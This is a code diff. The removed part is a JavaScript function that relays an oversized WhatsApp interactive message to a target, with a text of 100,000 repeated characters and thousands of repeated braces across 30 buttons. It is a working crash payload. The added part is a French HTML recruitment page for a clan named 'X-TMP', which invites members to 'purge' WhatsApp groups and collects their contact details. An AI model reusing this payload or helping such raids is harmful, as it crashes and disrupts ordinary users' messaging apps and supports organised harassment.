@@ -1,36 +1,87 @@
-async function ForceXsystemMax(kirana, target) {
-  let message = {
-    viewOnceMessage: {
-      message: {
-        messageContextInfo: {
-          deviceListMetadata: {},
-          deviceListMetadataVersion: 2,
-        },
-        interactiveMessage: {
-          contextInfo: {
-            mentionedJid: [target],
-            isForwarded: true,
-            forwardingScore: 999999,
-            businessMessageForwardInfo: {
-              businessOwnerJid: target,
-            },
-          },
-          body: {
-            text: "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(100000), // Encore plus de texte !
-          },
-          nativeFlowMessage: {
-            messageParamsJson: "{".repeat(30000), // Plus de params JSON
-            buttons: [
-              ...Array(30).fill().map((_, i) => ({ // 30 boutons !
-                name: `cta_${['url', 'call', 'copy', 'reminder', 'location'][i % 5]}`,
-                ParamsJson: "{".repeat(25000),
-                version: 3,
-              })),
-            ],
-          },
-        },
-      },
-    },
-  };
-  await kirana.relayMessage(target, message, { participant: { jid: target } });
-}
+html
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recrutement X-TMP</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #0f172a;
+      color: #e2e8f0;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+      background: rgba(30, 41, 59, 0.8);
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    h1 {
+      color: #f87171;
+      font-size: 2em;
+    }
+    .clan-logo {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      margin: 20px 0;
+    }
+    .rules, .description {
+      text-align: left;
+      margin: 20px 0;
+      color: #cbd5e1;
+    }
+    input, textarea {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+      background: #334155;
+      color: #fff;
+    }
+    button {
+      background: #f87171;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #ef4444;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>𓋹🇦🇱 𝐑𝐄𝐂𝐑𝐔𝐓𝐄𝐌𝐄𝐍𝐓 𝐗-𝐓𝐌𝐏🇦🇱𓋹</h1>
+    <img src="https://files.catbox.moe/jgp2kt.jpg" alt="Logo X-TMP" class="clan-logo">
+    <div class="description">
+      <p>🇦🇱𓋹┊ 𝐄𝐌𝐏𝐈𝐑𝐄 𝐗- 𝐓𝐌𝐏┊ 𓋹🇦🇱</p>
+      <p>Le secret du monde de la purge fut donné aux hommes, un monde où la vérité est basée sur le mensonge...</p>
+      <p>✄ Pas de pitié. Seule la loi du sang.<br>✄ Soit tu chasses, Soit tu te fais chasser.</p>
+    </div>
+    <div class="rules">
+      <h3>Règles pour rejoindre :</h3>
+      <p>1. Toujours porter le blason du clan : 𝐗-𝐓𝐌𝐏🏵️¡!</p>
+      <p>2. Pas de purge Solo. Si t'as un groupe à purger, envoie le lien dans le QG (si ouvert) ou contacte un administrateur.</p>
+      <p><em>Si ça te va, Bienvenue Chez Nous.!!</em></p>
+    </div>
+    <form>
+      <input type="text" placeholder="Nom" required>
+      <input type="text" placeholder="Contact (WhatsApp, Discord)" required>
+      <textarea placeholder="Présentation courte" rows="4"></textarea>
+      <button type="submit">Rejoindre le clan</button>
+    </form>
+    <p><small>Développeur : ࿇ 𝖃 | 𝐓𝐌𝐏⌁𝐇𝐀𝐄𝐍 ࿇</small></p>
+  </div>
+</body>
+</html>
